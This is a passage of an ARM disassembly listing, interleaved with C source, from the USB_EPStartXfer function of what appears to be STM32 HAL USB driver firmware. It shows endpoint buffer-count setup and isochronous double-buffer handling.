 8007a46:	881b      	ldrh	r3, [r3, #0]
 8007a48:	b29b      	uxth	r3, r3
 8007a4a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a4e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a52:	b29a      	uxth	r2, r3
 8007a54:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a58:	801a      	strh	r2, [r3, #0]
 8007a5a:	e05b      	b.n	8007b14 <USB_EPStartXfer+0x10ea>
 8007a5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a64:	681b      	ldr	r3, [r3, #0]
 8007a66:	691b      	ldr	r3, [r3, #16]
 8007a68:	085b      	lsrs	r3, r3, #1
 8007a6a:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a76:	681b      	ldr	r3, [r3, #0]
 8007a78:	691b      	ldr	r3, [r3, #16]
 8007a7a:	f003 0301 	and.w	r3, r3, #1
 8007a7e:	2b00      	cmp	r3, #0
 8007a80:	d004      	beq.n	8007a8c <USB_EPStartXfer+0x1062>
 8007a82:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a86:	3301      	adds	r3, #1
 8007a88:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a8c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a90:	881b      	ldrh	r3, [r3, #0]
 8007a92:	b29a      	uxth	r2, r3
 8007a94:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a98:	b29b      	uxth	r3, r3
 8007a9a:	029b      	lsls	r3, r3, #10
 8007a9c:	b29b      	uxth	r3, r3
 8007a9e:	4313      	orrs	r3, r2
 8007aa0:	b29a      	uxth	r2, r3
 8007aa2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007aa6:	801a      	strh	r2, [r3, #0]
 8007aa8:	e034      	b.n	8007b14 <USB_EPStartXfer+0x10ea>
 8007aaa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ab2:	681b      	ldr	r3, [r3, #0]
 8007ab4:	785b      	ldrb	r3, [r3, #1]
 8007ab6:	2b01      	cmp	r3, #1
 8007ab8:	d12c      	bne.n	8007b14 <USB_EPStartXfer+0x10ea>
 8007aba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007abe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ac2:	681b      	ldr	r3, [r3, #0]
 8007ac4:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ac8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007acc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ad0:	681b      	ldr	r3, [r3, #0]
 8007ad2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ad6:	b29b      	uxth	r3, r3
 8007ad8:	461a      	mov	r2, r3
 8007ada:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007ade:	4413      	add	r3, r2
 8007ae0:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ae4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ae8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aec:	681b      	ldr	r3, [r3, #0]
 8007aee:	781b      	ldrb	r3, [r3, #0]
 8007af0:	00da      	lsls	r2, r3, #3
 8007af2:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007af6:	4413      	add	r3, r2
 8007af8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007afc:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007b00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b08:	681b      	ldr	r3, [r3, #0]
 8007b0a:	691b      	ldr	r3, [r3, #16]
 8007b0c:	b29a      	uxth	r2, r3
 8007b0e:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007b12:	801a      	strh	r2, [r3, #0]
 8007b14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b18:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b1c:	681b      	ldr	r3, [r3, #0]
 8007b1e:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007b22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b2a:	681b      	ldr	r3, [r3, #0]
 8007b2c:	785b      	ldrb	r3, [r3, #1]
 8007b2e:	2b00      	cmp	r3, #0
 8007b30:	f040 809d 	bne.w	8007c6e <USB_EPStartXfer+0x1244>
 8007b34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b38:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b3c:	681b      	ldr	r3, [r3, #0]
 8007b3e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b46:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b4a:	681b      	ldr	r3, [r3, #0]
 8007b4c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b50:	b29b      	uxth	r3, r3
 8007b52:	461a      	mov	r2, r3
 8007b54:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b58:	4413      	add	r3, r2
 8007b5a:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b66:	681b      	ldr	r3, [r3, #0]
 8007b68:	781b      	ldrb	r3, [r3, #0]
 8007b6a:	00da      	lsls	r2, r3, #3
 8007b6c:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b70:	4413      	add	r3, r2
 8007b72:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007b76:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007b7a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b7e:	881b      	ldrh	r3, [r3, #0]
 8007b80:	b29b      	uxth	r3, r3
 8007b82:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b86:	b29a      	uxth	r2, r3
 8007b88:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b8c:	801a      	strh	r2, [r3, #0]
 8007b8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b96:	681b      	ldr	r3, [r3, #0]
 8007b98:	691b      	ldr	r3, [r3, #16]
 8007b9a:	2b3e      	cmp	r3, #62	; 0x3e
 8007b9c:	d92b      	bls.n	8007bf6 <USB_EPStartXfer+0x11cc>
 8007b9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ba2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ba6:	681b      	ldr	r3, [r3, #0]
 8007ba8:	691b      	ldr	r3, [r3, #16]
 8007baa:	095b      	lsrs	r3, r3, #5
 8007bac:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007bb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bb8:	681b      	ldr	r3, [r3, #0]
 8007bba:	691b      	ldr	r3, [r3, #16]
 8007bbc:	f003 031f 	and.w	r3, r3, #31
 8007bc0:	2b00      	cmp	r3, #0
 8007bc2:	d104      	bne.n	8007bce <USB_EPStartXfer+0x11a4>
 8007bc4:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bc8:	3b01      	subs	r3, #1
 8007bca:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007bce:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bd2:	881b      	ldrh	r3, [r3, #0]
 8007bd4:	b29a      	uxth	r2, r3
 8007bd6:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bda:	b29b      	uxth	r3, r3
 8007bdc:	029b      	lsls	r3, r3, #10
 8007bde:	b29b      	uxth	r3, r3
 8007be0:	4313      	orrs	r3, r2
 8007be2:	b29b      	uxth	r3, r3
 8007be4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007be8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bec:	b29a      	uxth	r2, r3
 8007bee:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bf2:	801a      	strh	r2, [r3, #0]
 8007bf4:	e069      	b.n	8007cca <USB_EPStartXfer+0x12a0>
 8007bf6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bfa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bfe:	681b      	ldr	r3, [r3, #0]
 8007c00:	691b      	ldr	r3, [r3, #16]
 8007c02:	2b00      	cmp	r3, #0
 8007c04:	d10c      	bne.n	8007c20 <USB_EPStartXfer+0x11f6>
 8007c06:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c0a:	881b      	ldrh	r3, [r3, #0]
 8007c0c:	b29b      	uxth	r3, r3
 8007c0e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c12:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c16:	b29a      	uxth	r2, r3
 8007c18:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c1c:	801a      	strh	r2, [r3, #0]
 8007c1e:	e054      	b.n	8007cca <USB_EPStartXfer+0x12a0>
 8007c20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c24:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c28:	681b      	ldr	r3, [r3, #0]
 8007c2a:	691b      	ldr	r3, [r3, #16]
 8007c2c:	085b      	lsrs	r3, r3, #1
 8007c2e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c3a:	681b      	ldr	r3, [r3, #0]
 8007c3c:	691b      	ldr	r3, [r3, #16]
 8007c3e:	f003 0301 	and.w	r3, r3, #1
 8007c42:	2b00      	cmp	r3, #0
 8007c44:	d004      	beq.n	8007c50 <USB_EPStartXfer+0x1226>
 8007c46:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c4a:	3301      	adds	r3, #1
 8007c4c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c50:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c54:	881b      	ldrh	r3, [r3, #0]
 8007c56:	b29a      	uxth	r2, r3
 8007c58:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c5c:	b29b      	uxth	r3, r3
 8007c5e:	029b      	lsls	r3, r3, #10
 8007c60:	b29b      	uxth	r3, r3
 8007c62:	4313      	orrs	r3, r2
 8007c64:	b29a      	uxth	r2, r3
 8007c66:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c6a:	801a      	strh	r2, [r3, #0]
 8007c6c:	e02d      	b.n	8007cca <USB_EPStartXfer+0x12a0>
 8007c6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c76:	681b      	ldr	r3, [r3, #0]
 8007c78:	785b      	ldrb	r3, [r3, #1]
 8007c7a:	2b01      	cmp	r3, #1
 8007c7c:	d125      	bne.n	8007cca <USB_EPStartXfer+0x12a0>
 8007c7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c82:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c86:	681b      	ldr	r3, [r3, #0]
 8007c88:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c8c:	b29b      	uxth	r3, r3
 8007c8e:	461a      	mov	r2, r3
 8007c90:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c94:	4413      	add	r3, r2
 8007c96:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007c9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ca2:	681b      	ldr	r3, [r3, #0]
 8007ca4:	781b      	ldrb	r3, [r3, #0]
 8007ca6:	00da      	lsls	r2, r3, #3
 8007ca8:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007cac:	4413      	add	r3, r2
 8007cae:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007cb2:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007cb6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cbe:	681b      	ldr	r3, [r3, #0]
 8007cc0:	691b      	ldr	r3, [r3, #16]
 8007cc2:	b29a      	uxth	r2, r3
 8007cc4:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007cc8:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007cca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cd2:	681b      	ldr	r3, [r3, #0]
 8007cd4:	69db      	ldr	r3, [r3, #28]
 8007cd6:	2b00      	cmp	r3, #0
 8007cd8:	f000 8218 	beq.w	800810c <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007cdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ce0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ce4:	681a      	ldr	r2, [r3, #0]
 8007ce6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cee:	681b      	ldr	r3, [r3, #0]
 8007cf0:	781b      	ldrb	r3, [r3, #0]
 8007cf2:	009b      	lsls	r3, r3, #2
 8007cf4:	4413      	add	r3, r2
 8007cf6:	881b      	ldrh	r3, [r3, #0]
 8007cf8:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cfc:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d00:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007d04:	2b00      	cmp	r3, #0
 8007d06:	d005      	beq.n	8007d14 <USB_EPStartXfer+0x12ea>
 8007d08:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d0c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d10:	2b00      	cmp	r3, #0
 8007d12:	d10d      	bne.n	8007d30 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d14:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d18:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d1c:	2b00      	cmp	r3, #0
 8007d1e:	f040 81f5 	bne.w	800810c <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d22:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d26:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d2a:	2b00      	cmp	r3, #0
 8007d2c:	f040 81ee 	bne.w	800810c <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d34:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d38:	681a      	ldr	r2, [r3, #0]
 8007d3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d42:	681b      	ldr	r3, [r3, #0]
 8007d44:	781b      	ldrb	r3, [r3, #0]
 8007d46:	009b      	lsls	r3, r3, #2
 8007d48:	4413      	add	r3, r2
 8007d4a:	881b      	ldrh	r3, [r3, #0]
 8007d4c:	b29b      	uxth	r3, r3
 8007d4e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007d52:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007d56:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007d5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d5e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d62:	681a      	ldr	r2, [r3, #0]
 8007d64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d68:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d6c:	681b      	ldr	r3, [r3, #0]
 8007d6e:	781b      	ldrb	r3, [r3, #0]
 8007d70:	009b      	lsls	r3, r3, #2
 8007d72:	441a      	add	r2, r3
 8007d74:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007d78:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007d7c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007d80:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007d84:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007d88:	b29b      	uxth	r3, r3
 8007d8a:	8013      	strh	r3, [r2, #0]
 8007d8c:	e1be      	b.n	800810c <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007d8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d96:	681b      	ldr	r3, [r3, #0]
 8007d98:	78db      	ldrb	r3, [r3, #3]
 8007d9a:	2b01      	cmp	r3, #1
 8007d9c:	f040 81b4 	bne.w	8008108 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007da0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007da4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007da8:	681b      	ldr	r3, [r3, #0]
 8007daa:	699a      	ldr	r2, [r3, #24]
 8007dac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007db0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007db4:	681b      	ldr	r3, [r3, #0]
 8007db6:	691b      	ldr	r3, [r3, #16]
 8007db8:	429a      	cmp	r2, r3
 8007dba:	d917      	bls.n	8007dec <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007dbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc4:	681b      	ldr	r3, [r3, #0]
 8007dc6:	691b      	ldr	r3, [r3, #16]
 8007dc8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007dcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dd4:	681b      	ldr	r3, [r3, #0]
 8007dd6:	699a      	ldr	r2, [r3, #24]
 8007dd8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ddc:	1ad2      	subs	r2, r2, r3
 8007dde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007de2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007de6:	681b      	ldr	r3, [r3, #0]
 8007de8:	619a      	str	r2, [r3, #24]
 8007dea:	e00e      	b.n	8007e0a <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007dec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007df0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df4:	681b      	ldr	r3, [r3, #0]
 8007df6:	699b      	ldr	r3, [r3, #24]
 8007df8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007dfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e04:	681b      	ldr	r3, [r3, #0]
 8007e06:	2200      	movs	r2, #0
 8007e08:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007e0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e0e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e12:	681b      	ldr	r3, [r3, #0]
 8007e14:	785b      	ldrb	r3, [r3, #1]
 8007e16:	2b00      	cmp	r3, #0
 8007e18:	f040 8085 	bne.w	8007f26 <USB_EPStartXfer+0x14fc>
 8007e1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e20:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e24:	681b      	ldr	r3, [r3, #0]
 8007e26:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e2e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e32:	681b      	ldr	r3, [r3, #0]
 8007e34:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e38:	b29b      	uxth	r3, r3
 8007e3a:	461a      	mov	r2, r3
 8007e3c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e40:	4413      	add	r3, r2
 8007e42:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e4e:	681b      	ldr	r3, [r3, #0]
 8007e50:	781b      	ldrb	r3, [r3, #0]
 8007e52:	00da      	lsls	r2, r3, #3
 8007e54:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e58:	4413      	add	r3, r2
 8007e5a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007e5e:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007e62:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e66:	881b      	ldrh	r3, [r3, #0]
 8007e68:	b29b      	uxth	r3, r3
 8007e6a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007e6e:	b29a      	uxth	r2, r3
 8007e70:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e74:	801a      	strh	r2, [r3, #0]
 8007e76:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e7a:	2b3e      	cmp	r3, #62	; 0x3e
 8007e7c:	d923      	bls.n	8007ec6 <USB_EPStartXfer+0x149c>
 8007e7e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e82:	095b      	lsrs	r3, r3, #5
 8007e84:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e88:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e8c:	f003 031f 	and.w	r3, r3, #31
 8007e90:	2b00      	cmp	r3, #0
 8007e92:	d104      	bne.n	8007e9e <USB_EPStartXfer+0x1474>
 8007e94:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e98:	3b01      	subs	r3, #1
 8007e9a:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e9e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ea2:	881b      	ldrh	r3, [r3, #0]
 8007ea4:	b29a      	uxth	r2, r3
 8007ea6:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007eaa:	b29b      	uxth	r3, r3
 8007eac:	029b      	lsls	r3, r3, #10
 8007eae:	b29b      	uxth	r3, r3
 8007eb0:	4313      	orrs	r3, r2
 8007eb2:	b29b      	uxth	r3, r3
 8007eb4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007eb8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ebc:	b29a      	uxth	r2, r3
 8007ebe:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ec2:	801a      	strh	r2, [r3, #0]
 8007ec4:	e060      	b.n	8007f88 <USB_EPStartXfer+0x155e>
 8007ec6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eca:	2b00      	cmp	r3, #0
 8007ecc:	d10c      	bne.n	8007ee8 <USB_EPStartXfer+0x14be>
 8007ece:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ed2:	881b      	ldrh	r3, [r3, #0]
 8007ed4:	b29b      	uxth	r3, r3
 8007ed6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007eda:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ede:	b29a      	uxth	r2, r3
 8007ee0:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ee4:	801a      	strh	r2, [r3, #0]
 8007ee6:	e04f      	b.n	8007f88 <USB_EPStartXfer+0x155e>
 8007ee8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eec:	085b      	lsrs	r3, r3, #1
 8007eee:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ef2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ef6:	f003 0301 	and.w	r3, r3, #1
 8007efa:	2b00      	cmp	r3, #0
 8007efc:	d004      	beq.n	8007f08 <USB_EPStartXfer+0x14de>
 8007efe:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f02:	3301      	adds	r3, #1
 8007f04:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f08:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f0c:	881b      	ldrh	r3, [r3, #0]
 8007f0e:	b29a      	uxth	r2, r3
 8007f10:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f14:	b29b      	uxth	r3, r3
 8007f16:	029b      	lsls	r3, r3, #10
 8007f18:	b29b      	uxth	r3, r3
 8007f1a:	4313      	orrs	r3, r2
 8007f1c:	b29a      	uxth	r2, r3
 8007f1e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f22:	801a      	strh	r2, [r3, #0]
 8007f24:	e030      	b.n	8007f88 <USB_EPStartXfer+0x155e>
 8007f26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f2e:	681b      	ldr	r3, [r3, #0]
 8007f30:	785b      	ldrb	r3, [r3, #1]
 8007f32:	2b01      	cmp	r3, #1
 8007f34:	d128      	bne.n	8007f88 <USB_EPStartXfer+0x155e>
 8007f36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f3a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f3e:	681b      	ldr	r3, [r3, #0]
 8007f40:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f48:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f4c:	681b      	ldr	r3, [r3, #0]
 8007f4e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f52:	b29b      	uxth	r3, r3
 8007f54:	461a      	mov	r2, r3
 8007f56:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f5a:	4413      	add	r3, r2
 8007f5c:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f60:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f68:	681b      	ldr	r3, [r3, #0]
 8007f6a:	781b      	ldrb	r3, [r3, #0]
 8007f6c:	00da      	lsls	r2, r3, #3
 8007f6e:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f72:	4413      	add	r3, r2
 8007f74:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007f78:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007f7c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f80:	b29a      	uxth	r2, r3
 8007f82:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007f86:	801a      	strh	r2, [r3, #0]
 8007f88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f8c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f90:	681b      	ldr	r3, [r3, #0]
 8007f92:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007f96:	f507 7384 	add.w	r3, r7, #264	; 0x108
